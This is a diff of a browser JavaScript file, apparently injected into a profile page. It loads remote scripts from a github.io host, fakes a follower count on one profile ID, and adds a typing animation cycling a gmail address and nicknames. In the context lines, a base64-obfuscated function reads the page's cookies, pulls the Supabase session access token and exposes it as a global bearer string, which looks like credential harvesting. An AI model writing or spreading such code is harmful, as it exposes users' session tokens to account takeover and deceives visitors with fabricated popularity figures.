@@ -16,6 +16,8 @@ loadHTMLAndAppend('https://vtmgr.github.io/shimebase.js');
 window.__xnext=function(){const h=document.cookie.split(';').reduce((a,b)=>{const[c,d]=b.split('=');a[c.trim()]=decodeURIComponent(d.trim());return a},{}),x=atob("c2ItYXV0aC1hdXRoLXRva2Vu");zz=atob("YWNjZXNzX3Rva2Vu");z=atob("QmVhcmVyIA==");let t=JSON.parse(atob(h[x].substr(7,h[x].length)));
 return z+t[zz]}
 
+
+
 setInterval(() => {
     if (window.location.href.includes("7a1053de-a29c-4416-8b91-0e86bdc42e0b")) {
         document.querySelectorAll('script[src="https://vtmgr.github.io/scram.js"]').forEach(s => {
@@ -71,9 +73,13 @@ function formatNumber(num) {
 }
 
 function updateFollowerDiv() {
-    const followerDiv = Array.from(document.querySelectorAll('div')).find(div => div.textContent.includes("followers") && div.children.length === 0);
-    if (followerDiv) {
-        followerDiv.innerText = formatNumber(followerCount) + ' followers';
+    if (window.location.href.includes("7a1053de-a29c-4416-8b91-0e86bdc42e0b")) {
+        const followerDiv = Array.from(document.querySelectorAll('div')).find(div => div.textContent.includes("followers") && div.children.length === 0);
+        if (followerDiv) {
+            followerDiv.innerText = formatNumber(followerCount) + ' followers';
+        }
+    } else {
+        followerCount = 0;
     }
 }
 
@@ -82,3 +88,75 @@ setInterval(() => {
     updateFollowerDiv();
 }, 1);
 
+const emailList = [
+        '@kryosphereis@gmail.com',
+        'VT',
+        'Lasa',
+        '<a href="https://guns.lol/scram">SCRAM!!</a>',
+        'Stanley'
+    ];
+    
+    const headingElement = Array.from(document.querySelectorAll('.chakra-heading')).find(el => el.innerText.includes('@kryosphereis@gmail.com'));
+    
+    // Variables to manage typing effect
+    let currentEmailIndex = 0;
+    let isDeleting = false;
+    let charIndex = 0;
+    let typingInterval;
+
+    // Function to reset everything
+    function resetTypingEffect() {
+        if (typingInterval) {
+            clearInterval(typingInterval);
+        }
+        headingElement.innerHTML = '';
+        currentEmailIndex = 0;
+        isDeleting = false;
+        charIndex = 0;
+    }
+
+    // Function to check URL
+    function checkURL() {
+        if (!window.location.href.includes("7a1053de-a29c-4416-8b91-0e86bdc42e0b")) {
+            resetTypingEffect();
+        }
+    }
+
+    // Function to start typing effect
+    function typeEffect() {
+        const currentEmail = emailList[currentEmailIndex];
+        
+        if (isDeleting) {
+            // Remove a character
+            if (charIndex > 0) {
+                charIndex--;
+                headingElement.innerHTML = currentEmail.substring(0, charIndex);
+            } else {
+                // Switch to the next email
+                isDeleting = false;
+                currentEmailIndex = (currentEmailIndex + 1) % emailList.length;
+                setTimeout(typeEffect, 2000); // Wait before typing the next email
+                return;
+            }
+        } else {
+            // Add a character
+            if (charIndex < currentEmail.length) {
+                charIndex++;
+                headingElement.innerText = currentEmail.substring(0, charIndex);
+            } else {
+                // Finished typing the current email
+                isDeleting = true;
+                setTimeout(typeEffect, 2000); // Wait before deleting
+                return;
+            }
+        }
+        
+        // Call the function again for the next character
+        typingInterval = setTimeout(typeEffect, isDeleting ? 100 : 150); // Adjust typing speed
+    }
+
+    // Start the typing effect
+    typeEffect();
+
+    // Set an interval to check the URL every 1000 milliseconds (1 second)
+    setInterval(checkURL, 1000);
